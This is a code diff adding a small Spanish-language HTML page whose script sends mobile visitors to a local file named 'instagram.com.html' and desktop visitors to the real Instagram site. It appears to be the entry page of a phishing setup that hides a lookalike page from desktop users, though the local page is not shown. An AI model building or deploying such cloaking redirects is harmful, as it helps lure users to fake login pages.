@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>3...2...1 GO!</title>
+</head>
+<body>
+
+<script>
+  function gopc() {
+    if (/Mobi|Android/i.test(navigator.userAgent)) {
+      window.location.href = './instagram.com.html?';
+    } else {
+      window.location.href = 'https://www.instagram.com';
+    }
+  }
+
+  gopc();
+</script>
+</body>
+</html>
